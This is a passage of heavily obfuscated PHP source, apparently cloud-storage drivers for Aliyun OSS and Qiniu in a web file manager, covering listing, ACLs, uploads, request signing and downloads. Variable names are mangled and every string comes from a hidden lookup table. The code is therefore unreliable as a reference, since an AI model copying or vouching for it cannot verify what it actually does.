(isset($¦Ó…ñ›•[$à¨“Ã¥[217]]) && !trim($Ü“¹²‚À[$à¨“Ã¥[98]])) { $Ü“¹²‚À[$à¨“Ã¥[98]] = $¦Ó…ñ›•[$à¨“Ã¥[217]]; } return $Ü“¹²‚À; } private function folderInfo($¥ªŒ»ü×, $ùçÅÉš = false, $¹ñËƒÅù = array()) { $šû‡õƒ² =& $_SERVER[¬ÏÕ§Áú]; $ãÙÅ¿Şø = array($šû‡õƒ²[32] => $this->pathThis($¥ªŒ»ü×), $šû‡õƒ²[97] => $this->getPathOuter($šû‡õƒ²[8] . $¥ªŒ»ü×), $šû‡õƒ²[33] => $šû‡õƒ²[88]); if ($ùçÅÉš) { return $ãÙÅ¿Şø; } $ãÙÅ¿Şø[$šû‡õƒ²[244]] = $ãÙÅ¿Şø[$šû‡õƒ²[98]] = 0; $ãÙÅ¿Şø[$šû‡õƒ²[245]] = $ãÙÅ¿Şø[$šû‡õƒ²[246]] = !0; if (empty($¹ñËƒÅù)) { $¥ªŒ»ü× = rtrim($¥ªŒ»ü×, $šû‡õƒ²[8]) . $šû‡õƒ²[8]; $í‡ıñÕì = $this->objectMeta($¥ªŒ»ü×); if (!$í‡ıñÕì) { return $ãÙÅ¿Şø; } $¹ñËƒÅù = array($šû‡õƒ²[244] => $í‡ıñÕì[$šû‡õƒ²[596]][$šû‡õƒ²[1545]], $šû‡õƒ²[98] => strtotime($í‡ıñÕì[$šû‡õƒ²[1542]])); } if (isset($¹ñËƒÅù[$šû‡õƒ²[98]])) { $ãÙÅ¿Şø[$šû‡õƒ²[98]] = $¹ñËƒÅù[$šû‡õƒ²[98]]; } if (isset($¹ñËƒÅù[$šû‡õƒ²[244]])) { $ãÙÅ¿Şø[$šû‡õƒ²[244]] = $¹ñËƒÅù[$šû‡õƒ²[244]]; } return $ãÙÅ¿Şø; } public function listPath($Ï–¯³î·, $Ò¨íÜ½€ = false) { $·¹à…ù‚ =& $_SERVER[¬ÏÕ§Áú]; $¨ÉÑ¨ì³ = $this->fileList($Ï–¯³î·, $·¹à…ù‚[8], !0); foreach ($¨ÉÑ¨ì³[$·¹à…ù‚[95]] as $’ÍôØ”¡ => $…ÁÀÃ“æ) { $¨ÉÑ¨ì³[$·¹à…ù‚[95]][$’ÍôØ”¡] = $this->folderInfo($…ÁÀÃ“æ, $Ò¨íÜ½€, $…ÁÀÃ“æ); } foreach ($¨ÉÑ¨ì³[$·¹à…ù‚[96]] as $’ÍôØ”¡ => $…ÁÀÃ“æ) { $¨ÉÑ¨ì³[$·¹à…ù‚[96]][$’ÍôØ”¡] = $this->fileInfo($…ÁÀÃ“æ[$·¹à…ù‚[32]], $Ò¨íÜ½€, $…ÁÀÃ“æ); } return $¨ÉÑ¨ì³; } protected function infoChildren($»Ñºï¹©, &$¶’¾µÏğ) { $·ñ›ÀåÉ =& $_SERVER[¬ÏÕ§Áú]; $¡áõ«”´ = $this->fileList($»Ñºï¹©, $·ñ›ÀåÉ[12], !0); $¶’¾µÏğ[$·ñ›ÀåÉ[91]] += count($¡áõ«”´[$·ñ›ÀåÉ[95]]); $¶’¾µÏğ[$·ñ›ÀåÉ[90]] += count($¡áõ«”´[$·ñ›ÀåÉ[96]]); foreach ($¡áõ«”´[$·ñ›ÀåÉ[96]] as $¼ê’É‘ï) { if (!$¼ê’É‘ï || !$¼ê’É‘ï[$·ñ›ÀåÉ[89]]) { continue; } $¶’¾µÏğ[$·ñ›ÀåÉ[89]] += $¼ê’É‘ï[$·ñ›ÀåÉ[89]]; } } public function has($´³Îô˜, $£—¯·Œ­ = false, $ÁêäôÃ = true) { $ÅŞÄ±Õ =& $_SERVER[¬ÏÕ§Áú]; $´³Îô˜ = trim($´³Îô˜, $ÅŞÄ±Õ[8]); $ ¬•ğÛÍ = empty($´³Îô˜) && $´³Îô˜ !== $ÅŞÄ±Õ[241] ? $ÅŞÄ±Õ[12] : $´³Îô˜ . $ÅŞÄ±Õ[8]; $ì³“Èì = $ÅŞÄ±Õ[12]; $ª‚óÍ¥ = 500; $é«ï×ûÏ = $÷®ÑöÃÈ = 0; while (!0) { check_abort(); $’½—­Úó = array($ÅŞÄ±Õ[1536] => $ÅŞÄ±Õ[8], $ÅŞÄ±Õ[1537] => $ ¬•ğÛÍ, $ÅŞÄ±Õ[1538] => $ª‚óÍ¥, $ÅŞÄ±Õ[1539] => $ì³“Èì); try { $†¯¼´ÊÅ = $this->client->listObjects($this->bucket, $’½—­Úó); } catch (OSS\Core\OssException $ùÎœÙ™è) { $this->writeLog(__FUNCTION__ . $ÅŞÄ±Õ[225] . $ùÎœÙ™è->getMessage()); break; } $ì³“Èì = $†¯¼´ÊÅ->getNextMarker(); $äê¶ªÖ« = $†¯¼´ÊÅ->getObjectList(); $µ†çøğŸ = $†¯¼´ÊÅ->getPrefixList(); if ($£—¯·Œ­) { if (count($äê¶ªÖ«) > 1 || count($äê¶ªÖ«) == 1 && $äê¶ªÖ«[0]->getKey() != $ ¬•ğÛÍ) { $é«ï×ûÏ += count($äê¶ªÖ«) - 1; } if (!empty($µ†çøğŸ)) { $÷®ÑöÃÈ += count($µ†çøğŸ); } if ($ì³“Èì === $ÅŞÄ±Õ[12]) { break; } continue; } if ($ÁêäôÃ) { if (!empty($äê¶ªÖ«)) { if (count($äê¶ªÖ«) > 1 || $äê¶ªÖ«[0]->getKey() != $ ¬•ğÛÍ) { return !0; } } } else { if (!empty($µ†çøğŸ)) { return !0; } } if ($ì³“Èì === $ÅŞÄ±Õ[12]) { break; } } if ($£—¯·Œ­) { return array($ÅŞÄ±Õ[252] => $é«ï×ûÏ, $ÅŞÄ±Õ[253] => $÷®ÑöÃÈ); } return !1; } public function listAll($›‹ÁøÌ°) { $ëî‰‰ïÍ =& $_SERVER[¬ÏÕ§Áú]; $®¾ï´± = $this->fileList($›‹ÁøÌ°, $ëî‰‰ïÍ[12], !0); $şÏÎş§× = array_to_keyvalue($®¾ï´±[$ëî‰‰ïÍ[96]], $ëî‰‰ïÍ[32]); foreach ($®¾ï´±[$ëî‰‰ïÍ[95]] as $±»Ê¶Ó) { if (is_string($±»Ê¶Ó)) { $şÏÎş§×[$±»Ê¶Ó] = array($ëî‰‰ïÍ[89] => 0); } } return $this->listAllFiles($›‹ÁøÌ°, $şÏÎş§×); } public function canRead($à§¡ÚüË) { $¯ìõåå¡ =& $_SERVER[¬ÏÕ§Áú]; $øûÔåÉÁ = $this->pathAcl($à§¡ÚüË); return $øûÔåÉÁ == $¯ìõåå¡[1546] || $øûÔåÉÁ == $¯ìõåå¡[643] ? !0 : !1; } public function canWrite($åø·ßß®) { $á¨…ê”… = $this->pathAcl($åø·ßß®); return $á¨…ê”… == $_SERVER[¬ÏÕ§Áú][643] ? !0 : !1; } public function pathAcl($øªšô¯) { $Öù¶Ø›™ =& $_SERVER[¬ÏÕ§Áú]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ºÓØàĞ¥ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($øªšô¯)); } catch (OSS\Core\OssException $ÄïˆĞÕ–) { $this->writeLog(__FUNCTION__ . $Öù¶Ø›™[225] . $ÄïˆĞÕ–->getMessage()); return !1; } $·êÆÓî  = $ºÓØàĞ¥ == $Öù¶Ø›™[37] ? $this->bucketAcl : $ºÓØàĞ¥; if ($·êÆÓî  == $Öù¶Ø›™[1547]) { return $Öù¶Ø›™[1546]; } if ($·êÆÓî  == $Öù¶Ø›™[1548]) { return $Öù¶Ø›™[643]; } return $·êÆÓî ; } private function chmodPath($ŸÔ×Ñ£, $º© Õµ” = '') { $¾Âš¹¯ =& $_SERVER[¬ÏÕ§Áú]; $íù„¯‰ = empty($º© Õµ”) ? $¾Âš¹¯[1548] : $º© Õµ”; $¥‰è¶µ = array($¾Âš¹¯[37], $¾Âš¹¯[242], $¾Âš¹¯[1547], $¾Âš¹¯[1548]); if (!in_array($íù„¯‰, $¥‰è¶µ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ŸÔ×Ñ£), $íù„¯‰); } catch (OSS\Core\OssException $±ú‘¿Úî) { $this->writeLog(__FUNCTION__ . $¾Âš¹¯[225] . $±ú‘¿Úî->getMessage()); return !1; } return !0; } public function getContent($ÜåÅµŠÊ) { return $this->fileSubstr($ÜåÅµŠÊ, -1); } public function setContent($©îö«œ§, $ş›Ì‘Ÿ¬ = '') { $­¯¿Ü© =& $_SERVER[¬ÏÕ§Áú]; try { $‘¢Æ‹­ç = $this->trafficLimit($­¯¿Ü©[1549]); $¨¿ÔË = $this->client->putObject($this->bucket, $this->pathEncode($©îö«œ§), $ş›Ì‘Ÿ¬, $‘¢Æ‹­ç); } catch (OSS\Core\OssException $Å†óŞŞè) { $this->writeLog(__FUNCTION__ . $­¯¿Ü©[225] . $Å†óŞŞè->getMessage()); return !1; } $—ğÉÓÜª = array($­¯¿Ü©[1543] => trim($¨¿ÔË[$­¯¿Ü©[1540]], $­¯¿Ü©[131]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($©îö«œ§))); $this->updateObjMeta($©îö«œ§, $—ğÉÓÜª); return isset($¨¿ÔË[$­¯¿Ü©[1550]][$­¯¿Ü©[306]]) ? !0 : !1; } private function updateObjMeta($˜Í©Ÿöâ, $¸«©åóü) { $˜Í©Ÿöâ = $this->pathEncode($˜Í©Ÿöâ); try { $çšó²ï = array(OSS\OssClient::OSS_HEADERS => $¸«©åóü); $this->client->copyObject($this->bucket, $˜Í©Ÿöâ, $this->bucket, $˜Í©Ÿöâ, $çšó²ï); } catch (OSS\Core\OssException $ÁÊìªŒÂ) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][225] . $ÁÊìªŒÂ->getMessage()); return !1; } return !0; } public function upload($»åÇ”…ë, $à¥°Ÿ½, $™õå§Üõ = false, $éÔÅöşû = REPEAT_REPLACE) { $šüú¶› =& $_SERVER[¬ÏÕ§Áú]; $û£•üÛ = trim($»åÇ”…ë, $šüú¶›[8]); $ğË‚ä´ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($šüú¶›[1543] => @md5_file($à¥°Ÿ½)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($»åÇ”…ë))); $ğË‚ä´ = $this->trafficLimit($šüú¶›[1549], $ğË‚ä´); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($û£•üÛ), $à¥°Ÿ½, $ğË‚ä´); } catch (OSS\Core\OssException $¼Ïœµ•è) { $this->writeLog(__FUNCTION__ . $šüú¶›[225] . $¼Ïœµ•è->getMessage()); return !1; } return $this->getPathOuter($»åÇ”…ë); } public function getHost() { $¤ÖŒõ‘Ä =& $_SERVER[¬ÏÕ§Áú]; $¢ÚÊêİœ = explode($¤ÖŒõ‘Ä[221], parent::getHost()); return $¢ÚÊêİœ[0] . $¤ÖŒõ‘Ä[221] . $this->bucket . $¤ÖŒõ‘Ä[10] . $¢ÚÊêİœ[1]; } public function uploadFormData($Äãƒ¹í, $¼éÎœ•— = 3600) { $¦¬ç–­• =& $_SERVER[¬ÏÕ§Áú]; if (!($¤›ÄşË = $this->getHost())) { return !1; } $‰ÂØØùï = $¼éÎœ•—; $ÄôÇÙ­Ñ = date($¦¬ç–­•[1551], time() + $‰ÂØØùï); $Ï÷ÑÀÖ = new DateTime($ÄôÇÙ­Ñ); $¨çÈ˜Æå = $Ï÷ÑÀÖ->format(DateTime::ISO8601); $Ğø²µí× = strpos($¨çÈ˜Æå, $¦¬ç–­•[382]); $¨çÈ˜Æå = substr($¨çÈ˜Æå, 0, $Ğø²µí×) . $¦¬ç–­•[1552]; $é¬ƒÙ£¯ = 1048576000 * 5; $Ö×ªÖÔÏ = $this->pathFather($Äãƒ¹í); $¥¥¢üÑ‡ = array($¦¬ç–­•[275] => $¨çÈ˜Æå, $¦¬ç–­•[278] => array(array($¦¬ç–­•[1553], 0, $é¬ƒÙ£¯), array($¦¬ç–­•[280], $¦¬ç–­•[281], $Ö×ªÖÔÏ))); $‰£å“Ä¥ = base64_encode(json_encode($¥¥¢üÑ‡)); $­œøĞê… = base64_encode(hash_hmac($¦¬ç–­•[1474], $‰£å“Ä¥, $this->secret, !0)); $ÓšÂ„ø = array($¦¬ç–­•[1554] => $this->accessKey, $¦¬ç–­•[290] => $‰£å“Ä¥, $¦¬ç–­•[283] => $¦¬ç–­•[274], $¦¬ç–­•[1555] => $­œøĞê…, $¦¬ç–­•[219] => $¤›ÄşË); $ÓšÂ„ø = $this->trafficLimit($¦¬ç–­•[1549], $ÓšÂ„ø, !0); return $ÓšÂ„ø; } public function uploadMultiData($Óöé¥ÓŠ, $ÛøÔú“‚ = 3600) { $ğ×İÂê =& $_SERVER[¬ÏÕ§Áú]; if (!($úÛÕäÇí = $this->getHost())) { return !1; } $£±¸Îé” = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Óöé¥ÓŠ)); return array($ğ×İÂê[294] => $£±¸Îé”, $ğ×İÂê[219] => $úÛÕäÇí . $ğ×İÂê[8] . $this->pathEncode($Óöé¥ÓŠ), $ğ×İÂê[295] => gmdate($ğ×İÂê[1556]), $ğ×İÂê[107] => $Óöé¥ÓŠ); } public function uploadMultiAuth($¸ô×ì³Í, $ÚŞıÃÏ² = array()) { if (isset($ÚŞıÃÏ²[$_SERVER[¬ÏÕ§Áú][296]])) { return $this->uploadPartAuth($¸ô×ì³Í, $ÚŞıÃÏ²); } return $this->uploadListAuth($¸ô×ì³Í, $ÚŞıÃÏ²); } private function uploadPartAuth($ÛÒö£¹š, $ ßŸÒí = array()) { $â›êˆ¨„ =& $_SERVER[¬ÏÕ§Áú]; $ŒçéªØå = $ ßŸÒí[$â›êˆ¨„[107]]; $òŒêå¼ = $this->_getUploadAuth($ŒçéªØå, $ ßŸÒí); $ŸÍÙíï© = array($â›êˆ¨„[298] => $òŒêå¼[$â›êˆ¨„[298]], $â›êˆ¨„[295] => $òŒêå¼[$â›êˆ¨„[295]]); if (isset($òŒêå¼[$â›êˆ¨„[1557]])) { $ŸÍÙíï©[$â›êˆ¨„[1557]] = $òŒêå¼[$â›êˆ¨„[1557]]; } return $ŸÍÙíï©; } private function uploadListAuth($Èñ²šÌ, $ÕÛ†½ï× = array()) { $Ç³Ş“¿Û =& $_SERVER[¬ÏÕ§Áú]; $íæ ¤¢Ÿ = $ÕÛ†½ï×[$Ç³Ş“¿Û[107]]; $Ÿµãöœ = $ÕÛ†½ï×[$Ç³Ş“¿Û[294]]; $ûÈ‘ĞÀ¬ = $this->client->listParts($this->bucket, $this->pathEncode($íæ ¤¢Ÿ), $Ÿµãöœ); $’Íî¶‚Ñ = $ûÈ‘ĞÀ¬->getListPart(); $¡ŠÏš = array(); foreach ($’Íî¶‚Ñ as $›æ… Ö—) { $¡ŠÏš[] = array($Ç³Ş“¿Û[309] => $›æ… Ö—->getPartNumber(), $Ç³Ş“¿Û[310] => trim($›æ… Ö—->getETag(), $Ç³Ş“¿Û[131])); } if (!$¡ŠÏš) { return !1; } $æØäÙ™õ = $this->_getUploadAuth($íæ ¤¢Ÿ, $ÕÛ†½ï×); return array($Ç³Ş“¿Û[298] => $æØäÙ™õ[$Ç³Ş“¿Û[298]], $Ç³Ş“¿Û[295] => $æØäÙ™õ[$Ç³Ş“¿Û[295]], $Ç³Ş“¿Û[301] => $¡ŠÏš); } private function _getUploadAuth($¥›¦ã», $³ì˜®Ûô) { $Ï•·Å³ =& $_SERVER[¬ÏÕ§Áú]; $†øüİõª = gmdate($Ï•·Å³[1556]); $”ù¥¼è = isset($³ì˜®Ûô[$Ï•·Å³[296]]) ? $Ï•·Å³[266] : $Ï•·Å³[300]; $áØÔïãĞ = array_intersect_key($³ì˜®Ûô, array_flip(array($Ï•·Å³[296], $Ï•·Å³[294]))); ksort($áØÔïãĞ); $·ÃÂóñ = $áØÔïãĞ ? $Ï•·Å³[86] . http_build_query($áØÔïãĞ, null, $Ï•·Å³[297], PHP_QUERY_RFC3986) : $Ï•·Å³[12]; $†„áŸá© = array($”ù¥¼è, $Ï•·Å³[12], $Ï•·Å³[133], $†øüİõª, "\x78\x2d\157\x73\x73\x2d\x64\x61\164\x65\x3a{$†øüİõª}", $Ï•·Å³[8] . $this->bucket . $Ï•·Å³[8] . $¥›¦ã» . $·ÃÂóñ); if (isset($³ì˜®Ûô[$Ï•·Å³[296]])) { $œÈÖşŸ¬ = $this->trafficLimit($Ï•·Å³[1549], array(), !0); if ($œÈÖşŸ¬) { $¥›¦ã» = $Ï•·Å³[1557]; array_splice($†„áŸá©, 5, 0, $¥›¦ã» . $Ï•·Å³[4] . $œÈÖşŸ¬[$¥›¦ã»]); } } $¤Àçˆ‚¦ = implode($Ï•·Å³[65], $†„áŸá©); $š™çâ« = base64_encode(hash_hmac($Ï•·Å³[1474], $¤Àçˆ‚¦, $this->secret, !0)); $ÎªŒë­ = $Ï•·Å³[1526] . $this->accessKey . $Ï•·Å³[4] . $š™çâ«; $‰×Ù¨ê = array($Ï•·Å³[298] => $ÎªŒë­, $Ï•·Å³[295] => $†øüİõª); if (!empty($œÈÖşŸ¬)) { $‰×Ù¨ê = array_merge($‰×Ù¨ê, $œÈÖşŸ¬); } return $‰×Ù¨ê; } public function download($’õ¯Ñ¼á, $ôğ¬ïÈ±) { $à¿ãÖÃë =& $_SERVER[¬ÏÕ§Áú]; if ($this->isFolder($’õ¯Ñ¼á)) { return !1; } try { $ä¯ÂÁ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ôğ¬ïÈ±); $ä¯ÂÁ = $this->trafficLimit($à¿ãÖÃë[122], $ä¯ÂÁ); $this->client->getObject($this->bucket, $this->pathEncode($’õ¯Ñ¼á), $ä¯ÂÁ); } catch (OSS\Core\OssException $Ö®®ÊŒê) { $this->writeLog(__FUNCTION__ . $à¿ãÖÃë[225] . $Ö®®ÊŒê->getMessage()); return !1; } return $ôğ¬ïÈ±; } public function fileSubstr($±•§šÅ¯, $á•ãÒÎê = 0, $×íûâÏµ = false) { if ($á•ãÒÎê === -1) { $ø×ù¥µù = array(); } else { if ($×íûâÏµ === !1) { $Œûûë”  = $this->size($±•§šÅ¯); } else { $Œûûë”  = $á•ãÒÎê + $×íûâÏµ - 1; } $ø×ù¥µù = array(OSS\OssClient::OSS_RANGE => "{$á•ãÒÎê}\x2d{$Œûûë” }"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($±•§šÅ¯), $ø×ù¥µù); } catch (OSS\Core\OssException $ê·…¤‹„) { $this->writeLog(__FUNCTION__ . $_SERVER[¬ÏÕ§Áú][225] . $ê·…¤‹„->getMessage()); think_exception($ê·…¤‹„->getMessage()); return !1; } } private function trafficLimit($ŠÀßƒÂ¶, $™Ñìñšû = array(), $íöÑ×Çõ = false) { $ÄÕ”ùÉ² =& $_SERVER[¬ÏÕ§Áú]; if ($ŠÀßƒÂ¶ == $ÄÕ”ùÉ²[1549] && $this->isUploadServer() || $ŠÀßƒÂ¶ == $ÄÕ”ùÉ²[122] && $this->isFileOutServer()) { return $™Ñìñšû; } $˜»×àòÒ = floatval($GLOBALS[$ÄÕ”ùÉ²[6]][$ÄÕ”ùÉ²[102]][$ÄÕ”ùÉ²[120]][$ŠÀßƒÂ¶]) * 1024 * 1024 * 8; if (!$˜»×àòÒ) { return $™Ñìñšû; } $˜»×àòÒ = $˜»×àòÒ < 819200 ? 819200 : ($˜»×àòÒ > 838860800 ? 838860800 : $˜»×àòÒ); if ($íöÑ×Çõ) { $™Ñìñšû[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($˜»×àòÒ); } else { if (!isset($™Ñìñšû[OSS\OssClient::OSS_HEADERS])) { $™Ñìñšû[OSS\OssClient::OSS_HEADERS] = array(); } $™Ñìñšû[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($˜»×àòÒ); } return $™Ñìñšû; } public function link($Óé±Ü¡Õ, $—î›®Ãø = array()) { $ø­å‰¿Á =& $_SERVER[¬ÏÕ§Áú]; if (!$this->exist($Óé±Ü¡Õ) || $this->isFolder($Óé±Ü¡Õ)) { return !1; } try { $—î›®Ãø = $this->trafficLimit($ø­å‰¿Á[122], $—î›®Ãø, !0); $÷äöâ¼– = $this->client->signUrl($this->bucket, $this->pathEncode($Óé±Ü¡Õ), 3600 * 12, $ø­å‰¿Á[1558], $—î›®Ãø); return $this->getCdnLink($÷äöâ¼–); } catch (OSS\Core\OssException $Ş’Õ§ı«) { $this->writeLog(__FUNCTION__ . $ø­å‰¿Á[225] . $Ş’Õ§ı«->getMessage()); return !1; } } public function fileOut($Æ”àıàò, $Ú²üè•Ç = false, $Şœ´Ğõ = false, $‡‰¶§© = '') { $Ø‰¼‰£ =& $_SERVER[¬ÏÕ§Áú]; if ($this->isFileOutServer()) { return $this->fileOutServer($Æ”àıàò, $Ú²üè•Ç, $Şœ´Ğõ, $‡‰¶§©); } if (!$Şœ´Ğõ) { $Şœ´Ğõ = $this->pathThis($Æ”àıàò); } $Şœ´Ğõ = rawurlencode($Şœ´Ğõ); $—õŒî¸” = get_file_mime(get_path_ext($Şœ´Ğõ)); if ($—õŒî¸” == $Ø‰¼‰£[261]) { return parent::fileOut($Æ”àıàò, $Ú²üè•Ç, $Şœ´Ğõ, $‡‰¶§©); } $Ú²üè•Ç = $Ú²üè•Ç ? $Ø‰¼‰£[1559] : $Ø‰¼‰£[1560]; $º¶å—°Ú = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ø‰¼‰£[1561] . rawurlencode("{$Ú²üè•Ç}\73\x66\x69\154\145\156\141\155\x65\x3d{$Şœ´Ğõ}")); $Ìµå—Ù = $this->link($Æ”àıàò, $º¶å—°Ú); $this->fileOutLink($Ìµå—Ù); } public function fileOutServer($Õ˜˜Ê¿®, $µÊ«ôó© = false, $¸…÷½ñÕ = false, $¢”ú²Û = '') { parent::fileOut($Õ˜˜Ê¿®, $µÊ«ôó©, $¸…÷½ñÕ, $¢”ú²Û); } public function fileOutImage($–Şâ™‚¶, $Ãó·üŸÏ = 250) { if ($this->size($–Şâ™‚¶) > 1024 * 1024 * 20) { return $this->fileOutImageServer($–Şâ™‚¶, $Ãó·üŸÏ); } $‘®û•ò = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¬ÏÕ§Áú][1523] . $Ãó·üŸÏ); $¹×òİ®œ = $this->link($–Şâ™‚¶, $‘®û•ò); $this->fileOutLink($¹×òİ®œ); } public function fileOutImageServer($ŠÆºß¸å, $ ™Úµ­Û = 250) { parent::fileOutImage($ŠÆºß¸å, $ ™Úµ­Û); } public function fileOutLink($Š‹Œª›œ) { $ûÉúÇßµ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->isCdnHost() && substr($Š‹Œª›œ, 0, 7) == $ûÉúÇßµ[229]) { $Š‹Œª›œ = $ûÉúÇßµ[230] . substr($Š‹Œª›œ, 7); } header($ûÉúÇßµ[185] . $Š‹Œª›œ); die; } public function hashMd5($áßÎ–²‡, $õãšÊ ß = '') { $¢¾ú’Êõ =& $_SERVER[¬ÏÕ§Áú]; $è€Ä›ç = $this->_objectMeta($áßÎ–²‡); if (!$è€Ä›ç) { return $¢¾ú’Êõ[12]; } if (!isset($è€Ä›ç[$¢¾ú’Êõ[1543]]) && !empty($õãšÊ ß)) { $ĞÑŒ©¥‚ = $this->updateObjMeta($áßÎ–²‡, array($¢¾ú’Êõ[1543] => $õãšÊ ß)); $è€Ä›ç[$¢¾ú’Êõ[1543]] = $ĞÑŒ©¥‚ ? $õãšÊ ß : $¢¾ú’Êõ[12]; } return isset($è€Ä›ç[$¢¾ú’Êõ[1543]]) ? strtolower($è€Ä›ç[$¢¾ú’Êõ[1543]]) : $¢¾ú’Êõ[12]; } public function size($‡ôõ¶È«) { $» ÕÆ²à = $this->objectMeta($‡ôõ¶È«); return $» ÕÆ²à ? $» ÕÆ²à[$_SERVER[¬ÏÕ§Áú][89]] : 0; } public function info($ÏáÜş‰) { if ($this->isFolder($ÏáÜş‰)) { return $this->folderInfo($ÏáÜş‰); } else { if ($this->isFile($ÏáÜş‰)) { return $this->fileInfo($ÏáÜş‰); } } return !1; } public function exist($µÍ˜Üà—) { return $this->isFile($µÍ˜Üà—) || $this->isFolder($µÍ˜Üà—); } public function isFile($Íò„µÅ©) { return !$this->isFolder($Íò„µÅ©) && $this->objectMeta($Íò„µÅ©); } public function isFolder($Ğù´µÛ¬) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][190], $Ğù´µÛ¬); } protected function objectMeta($¢–± ¾) { return $this->cacheMethod($_SERVER[¬ÏÕ§Áú][192], $¢–± ¾); } protected function _objectMeta($¡óã¨«¥) { $âß¦õ¹æ =& $_SERVER[¬ÏÕ§Áú]; try { $¨¢‹Ë¦ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¡óã¨«¥)); } catch (OSS\Core\OssException $èºßûïî) { $this->writeLog(__FUNCTION__ . $âß¦õ¹æ[225] . $èºßûïî->getMessage()); $¨¢‹Ë¦ = !1; } if ($¨¢‹Ë¦) { $¨¢‹Ë¦[$âß¦õ¹æ[89]] = intval($¨¢‹Ë¦[$âß¦õ¹æ[1541]]); } return $¨¢‹Ë¦; } protected function _isFolder($ï¨Õ¹œÃ) { $‘¤´çÅ =& $_SERVER[¬ÏÕ§Áú]; if ($ï¨Õ¹œÃ == $‘¤´çÅ[12] || $ï¨Õ¹œÃ == $‘¤´çÅ[8]) { return !0; } $»¹²Ú±‹ = array($‘¤´çÅ[1536] => $‘¤´çÅ[8], $‘¤´çÅ[1537] => rtrim($ï¨Õ¹œÃ, $‘¤´çÅ[8]) . $‘¤´çÅ[8], $‘¤´çÅ[1538] => 1, $‘¤´çÅ[1539] => $‘¤´çÅ[12]); $òç¥™òˆ = $this->client->listObjects($this->bucket, $»¹²Ú±‹); if ($òç¥™òˆ->getObjectList() || $òç¥™òˆ->getPrefixList()) { return !0; } return !1; } public function writeLog($ı«ºÃ³Ó = '', $ã”Ò³üç = false) { $û—ù¨ø =& $_SERVER[¬ÏÕ§Áú]; $´š©öù¶ = in_array(ACTION, array($û—ù¨ø[223], $û—ù¨ø[224])); if (!$´š©öù¶ && !GLOBAL_DEBUG) { return; } $ûâÕ©¯† = 0; if (stripos($ı«ºÃ³Ó, $û—ù¨ø[1562]) !== !1) { $ûâÕ©¯† = 1; $‰úş•Òº = explode($û—ù¨ø[1563], $ı«ºÃ³Ó); $ı«ºÃ³Ó = !empty($‰úş•Òº[1]) ? $‰úş•Òº[1] : $ı«ºÃ³Ó; } else { if (stripos($ı«ºÃ³Ó, $û—ù¨ø[1564])) { $ûâÕ©¯† = 2; $‰úş•Òº = explode($û—ù¨ø[1564], $ı«ºÃ³Ó); $‰úş•Òº = explode($û—ù¨ø[4], $‰úş•Òº[0]); $ı«ºÃ³Ó = !empty($‰úş•Òº[1]) ? $‰úş•Òº[1] : $ı«ºÃ³Ó; } } if ($´š©öù¶ && I18n::getType() == $û—ù¨ø[1565]) { if ($ûâÕ©¯† == 1) { $ı«ºÃ³Ó = str_replace($û—ù¨ø[1566], $û—ù¨ø[1567], $ı«ºÃ³Ó); } else { if ($ûâÕ©¯† == 2) { $‰úş•Òº = explode($û—ù¨ø[225], $‰úş•Òº[0]); $è­àåè± = isset($‰úş•Òº[1]) ? $‰úş•Òº[1] : $û—ù¨ø[12]; $‹ùñ«´Ì = array($û—ù¨ø[1568] => $û—ù¨ø[1569], $û—ù¨ø[1570] => $û—ù¨ø[1571], $û—ù¨ø[1572] => $û—ù¨ø[1573], $û—ù¨ø[1574] => $û—ù¨ø[1575], $û—ù¨ø[1576] => $û—ù¨ø[1577], $û—ù¨ø[1578] => $û—ù¨ø[1579], $û—ù¨ø[1580] => $û—ù¨ø[1581], $û—ù¨ø[1582] => $û—ù¨ø[1583], $û—ù¨ø[1584] => $û—ù¨ø[1585], $û—ù¨ø[1586] => $û—ù¨ø[1587]); if (isset($‹ùñ«´Ì[$è­àåè±])) { $ı«ºÃ³Ó = $‹ùñ«´Ì[$è­àåè±]; } } } if (stripos($ı«ºÃ³Ó, $û—ù¨ø[1588])) { $ı«ºÃ³Ó = $û—ù¨ø[1589]; } } if (!trim($ı«ºÃ³Ó)) { return; } parent::writeLog(trim($ı«ºÃ³Ó), $ã”Ò³üç); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($´‡‰ä«) { parent::__construct(); require_once SDK_DIR . $_SERVER[¬ÏÕ§Áú][1590]; $this->_init($´‡‰ä«); } public function _init($¬¦¥“Ùİ) { $°±ÄÃÑÏ =& $_SERVER[¬ÏÕ§Áú]; $this->config = $¬¦¥“Ùİ; foreach ($¬¦¥“Ùİ as $¤ù©ÜÃ± => $Ñ²´óÛÌ) { if (isset($this->{$¤ù©ÜÃ±})) { $this->{$¤ù©ÜÃ±} = $Ñ²´óÛÌ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($°±ÄÃÑÏ[1591] . LNG($°±ÄÃÑÏ[1527])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($éäáˆ©ç, $ÂúØ¬Øî = '', 